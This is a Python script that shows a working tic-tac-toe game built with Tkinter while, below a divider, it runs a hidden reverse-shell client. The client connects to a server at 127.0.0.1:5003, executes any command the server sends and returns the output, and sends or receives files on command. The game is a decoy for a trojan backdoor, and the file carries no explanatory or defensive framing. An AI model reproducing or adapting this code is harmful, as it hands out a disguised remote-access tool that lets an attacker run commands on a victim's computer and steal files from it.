import socket
import subprocess
import os
import threading


import tkinter as tk
from tkinter import messagebox


class TicTacToe:
    def __init__(self, master):
        self.master = master
        self.master.title("Tic Tac Toe")
        self.current_player = "X"
        self.board = [" " for _ in range(9)]
        self.buttons = []

        for i in range(3):
            for j in range(3):
                button = tk.Button(master, text=" ", font=("Arial", 20), width=5, height=2,
                                   command=lambda i=i, j=j: self.make_move(i, j))
                button.grid(row=i, column=j, padx=5, pady=5)
                self.buttons.append(button)

    def make_move(self, row, col):
        index = 3 * row + col
        if self.board[index] == " ":
            self.board[index] = self.current_player
            self.buttons[index].config(text=self.current_player)
            if self.check_winner():
                messagebox.showinfo("Tic Tac Toe", f"Player {self.current_player} wins!")
                self.reset_board()
            elif " " not in self.board:
                messagebox.showinfo("Tic Tac Toe", "It's a tie!")
                self.reset_board()
            else:
                self.current_player = "O" if self.current_player == "X" else "X"

    def check_winner(self):
        winning_conditions = ((0, 1, 2), (3, 4, 5), (6, 7, 8),  # rows
                              (0, 3, 6), (1, 4, 7), (2, 5, 8),  # columns
                              (0, 4, 8), (2, 4, 6))  # diagonals
        for condition in winning_conditions:
            if self.board[condition[0]] == self.board[condition[1]] == self.board[condition[2]] != " ":
                return True
        return False

    def reset_board(self):
        self.current_player = "X"
        self.board = [" " for _ in range(9)]
        for button in self.buttons:
            button.config(text=" ")


def tic_tac_toe():
    root = tk.Tk()
    game = TicTacToe(root)
    root.mainloop()


####################################################################################

thread = threading.Thread(target=tic_tac_toe)
thread.start()


SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5003
BUFFER_SIZE = 1024
FORMAT = "utf-8"

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

# receive the greeting message
message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)


def general_commands():
    # execute the command and retrieve the results
    # print("before")
    output = subprocess.getoutput(command)
    # print("after")
    # send the results back to the server
    if not output:
        output = "done"
    s.send(output.encode())


def cd_command():
    os.chdir(str(command[3:]))
    s.send(os.getcwd().encode())


def download():
    [_, file_path, _] = command.split()
    file_name = os.path.basename(file_path)
    try:
        file = open(file_path, "r+")
        """ Sending the filename to the server. """
        s.send(file_name.encode(FORMAT))
        msg = s.recv(BUFFER_SIZE).decode(FORMAT)
        print(f"[SERVER]: {msg}")
        """ Sending the file data to the server. """
        sub_data = str()

        while sub_data != "END":
            # print("before")
            sub_data = file.read(BUFFER_SIZE)
            # print("after")
            if not sub_data:
                sub_data = "END"

            s.sendall(sub_data.encode(FORMAT))

        # print("after while")
        msg = s.recv(BUFFER_SIZE).decode(FORMAT)

        print(f"[SERVER]: {msg}")
        """ Closing the file. """
        file.close()

    except FileNotFoundError as NoFileErr:
        s.send(str(NoFileErr).encode(FORMAT))
    except Exception as err:
        s.send(str(err).encode(FORMAT))


def upload():
    [_, _, destination] = command.split()
    """ Receiving the filename from the server. """
    filename = s.recv(BUFFER_SIZE).decode(FORMAT)
    print(f"[RECV] Receiving the filename.")
    s.send("name received".encode(FORMAT))

    file = open(os.path.join(destination, filename), "a")
    """ Receiving the file data from the server. """
    while True:
        data = s.recv(BUFFER_SIZE).decode(FORMAT)
        # print("before")
        # print(data)
        # print("after")
        if data == "END":
            break
        elif data[-3:] == "END":
            file.write(data[:-3])
            break

        file.write(data)

    print(f"[RECV] Receiving the file data.")
    s.send("File data received".encode(FORMAT))
    """ Closing the file. """
    file.close()


while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit" or command.lower() == "finish":
        # if the command is exit, just break out of the loop
        break
    elif command.split()[0].lower() == "download":
        download()

    elif command.split()[0].lower() == "upload":
        upload()

    elif command.startswith("cd "):
        cd_command()

    else:
        general_commands()

# close client connection
s.close()
